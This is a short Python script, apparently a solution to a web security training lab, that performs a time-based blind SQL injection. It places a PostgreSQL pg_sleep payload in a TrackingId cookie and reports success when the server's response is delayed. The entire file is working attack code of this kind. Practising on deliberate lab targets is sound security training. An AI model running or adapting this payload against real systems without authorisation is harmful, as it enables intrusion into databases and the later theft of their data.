import requests
import sys
from requests.adapters import HTTPAdapter, Retry


def time_based_sqli_check(url, session):
    try:
        payload ="' || (SELECT pg_sleep(10))--"
        response = session.get(url, cookies={"TrackingId": payload}, timeout=20)
        return response.elapsed.total_seconds() > 9

    except requests.exceptions.MissingSchema:
        print("(-)Please enter a valid URL.")
        sys.exit(1)

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")
        sys.exit(1)

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

    print("(+) Attempting time based SQL Injection attack...")
    if time_based_sqli_check(url, session):
        print("(+) Time based SQL injection attack successfully completed.")
    else:
        print("(-) Time-based SQL injection attack unsuccessful. Please check your URL and try again.")


if __name__ == "__main__":
    main()
